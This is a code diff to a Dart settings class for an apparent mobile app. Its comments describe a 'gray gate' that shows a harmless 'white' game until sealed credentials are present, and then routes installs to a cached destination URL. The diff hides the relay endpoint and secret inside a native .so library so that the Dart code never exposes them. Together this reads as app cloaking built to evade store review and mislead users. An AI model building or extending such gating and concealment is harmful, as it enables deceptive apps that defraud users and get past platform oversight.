@@ -73,8 +73,10 @@ abstract final class PrismSettings {
   /// Freshness window of the cached destination URL. 3..14 days.
   static const int cacheLifetimeSeconds = 6 * 24 * 60 * 60;
 
-  // ── Resolved (sealed) endpoints & credentials ───────────────
-  static String get rulingEndpoint => unsealEndpoint();
+  // ── Resolved (sealed) credentials ───────────────────────────
+  // The relay endpoint + shared secret live ONLY inside
+  // libprism_core.so (the native `pr_route` caller uses them); Dart
+  // never resolves the endpoint and never performs the POST itself.
   static String get attributionKey => unsealAttributionKey();
   static String get messagingProject => unsealMessagingProject();
 
@@ -84,11 +86,12 @@ abstract final class PrismSettings {
   }
 
   /// The gray gate stays disabled — every install lands directly
-  /// in the native game — until all three sealed values decode
-  /// non-empty. This lets QA smoke-test the white part before the
-  /// operator has finished packing credentials.
+  /// in the native game — until the native relay library is loaded
+  /// AND both attribution credentials decode non-empty. This lets
+  /// QA smoke-test the white part before credentials are packed,
+  /// and fails safe on any device where the `.so` is missing.
   static bool get gateReady =>
-      rulingEndpoint.isNotEmpty &&
+      prismNativeReady &&
       attributionKey.isNotEmpty &&
       messagingProject.isNotEmpty;
 }
